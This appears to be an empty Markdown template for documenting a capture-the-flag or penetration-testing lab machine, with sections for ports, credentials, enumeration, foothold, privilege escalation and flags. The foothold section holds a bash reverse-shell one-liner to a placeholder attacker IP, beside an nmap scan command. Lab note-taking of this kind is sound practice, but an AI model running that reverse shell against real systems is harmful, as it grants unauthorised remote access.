---
title: "{{name}}"
created: {{date}}
updated: {{date}}
status: active
ip: 
os: 
platform: 
difficulty: 
tags: [box]
---

# {{name}}

> [!info] Target
> **IP:** $TARGET_IP · **Hostnames:** {{hosts}} · **Folder:** `~/boxes/{{name}}`

## Hosts

| Host | IP | Hostnames | OS | Notes |
|---|---|---|---|---|
| {{name}} | $TARGET_IP | {{hosts}} | | |

## Ports & services

| Port | Service | Version | Notes |
|---|---|---|---|
| | | | |

## Credentials & secrets

| Source | Username | Secret | Valid on | Notes |
|---|---|---|---|---|
| | | | | |

## Enumeration

```bash
nmap -p- --min-rate 2000 -oA ~/boxes/{{name}}/scans/all $TARGET_IP
```

## Foothold

> [!tip]- Reverse shell
> ```bash
> nc -lvnp 4444    # bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'
> ```

## Privilege escalation

## Timeline

## Flags

**User flag**
> [!success]- Flag
> 

**Root flag**
> [!success]- Flag
> 

## Lessons learned

- 
